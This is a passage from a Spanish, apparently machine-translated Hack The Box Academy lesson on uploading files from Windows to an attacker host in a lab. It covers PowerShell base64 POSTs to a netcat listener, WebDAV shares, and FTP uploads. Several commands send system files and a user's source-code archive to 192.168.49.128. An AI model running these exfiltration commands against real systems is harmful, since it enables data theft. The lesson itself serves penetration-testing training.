PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Atrapamos los datos de Base64 con NetCat y usamos la aplicación Base64 con la opción Decode para convertir la cadena en el archivo.

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ nc -lvnp 8000listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...

```

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts

```

---

# **Subes SMB**

Anteriormente discutimos que las empresas generalmente permiten el tráfico saliente utilizando`HTTP`(TCP/80) y`HTTPS`(TCP/443) Protocolos. Comúnmente, las empresas no permiten que el protocolo SMB (TCP/445) salga de su red interna porque esto puede abrirlos a posibles ataques. Para obtener más información sobre esto, podemos leer la publicación de Microsoft[Evitar el tráfico de SMB en conexiones laterales y ingresar o dejar la red](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

Una alternativa es ejecutar SMB sobre HTTP con`WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918)es una extensión de HTTP, el protocolo de Internet que los navegadores web y los servidores web usan para comunicarse entre sí. El`WebDAV`El protocolo permite que un servidor web se comporte como un servidor de archivos, admitiendo la autorización de contenido colaborativo.`WebDAV`También puede usar HTTPS.

Cuando usas`SMB`, primero intentará conectarse usando el protocolo SMB, y si no hay una acción SMB disponible, intentará conectarse usando HTTP. En la siguiente captura de Wireshark, intentamos conectarnos al archivo compartido`testing3`, y porque no encontró nada con`SMB`, usa`HTTP`.

![](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)

### **Configuración del servidor WebDav**

Para configurar nuestro servidor WebDav, necesitamos instalar dos módulos Python,`wsgidav`y`cheroot`(Puede leer más sobre esta implementación aquí:[wsgidav github](https://github.com/mar10/wsgidav)). Después de instalarlos, ejecutamos el`wsgidav`Aplicación en el directorio de destino.

### **Instalación de módulos WebDav Python**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ sudo pip3 install wsgidav cheroot[sudo] password for plaintext:
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...

```

### **Usando el módulo WebDav Python**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous [sudo] password for plaintext:
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...

```

### **Conectarse con WebDav Share**

Ahora podemos intentar conectarnos a la participación usando el`DavWWWRoot`directorio.

Métodos de transferencia de archivos de Windows

```
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free

```

**Nota:** `DavWWWRoot`es una palabra clave especial reconocida por Windows Shell. No existe dicha carpeta en su servidor WebDav. La palabra clave DavwWWOOT le dice al controlador mini-redirector, que maneja las solicitudes de WebDAV que se está conectando a la raíz del servidor WebDAV.

Puede evitar usar esta palabra clave si especifica una carpeta que existe en su servidor cuando se conecta al servidor. Por ejemplo: \ 192.168.49.128 \ ShareFolder

### **Cargar archivos usando SMB**

Métodos de transferencia de archivos de Windows

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

```

**Nota:**Si no hay restricciones SMB (TCP/445), puede usar Impacket-Smbserver de la misma manera que lo configuramos para las operaciones de descarga.

---

# **Subidas FTP**

Cargar archivos usando FTP es muy similar a la descarga de archivos. Podemos usar PowerShell o el cliente FTP para completar la operación. Antes de comenzar nuestro servidor FTP usando el módulo Python`pyftpdlib`, necesitamos especificar la opción`--write`Para permitir que los clientes carguen archivos en nuestro host de ataque.

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<

```

Ahora usemos la función de carga PowerShell para cargar un archivo en nuestro servidor FTP.

### **Archivo de carga de PowerShell**

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

```

### **Cree un archivo de comando para el cliente FTP para cargar un archivo**

Métodos de transferencia de archivos de Windows

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye

```

---

# **Resumen**

Discutimos varios métodos para descargar y cargar archivos utilizando herramientas nativas de Windows, pero hay más. En las siguientes secciones, discutiremos otros mecanismos y herramientas que podemos usar para realizar operaciones de transferencia de archivos.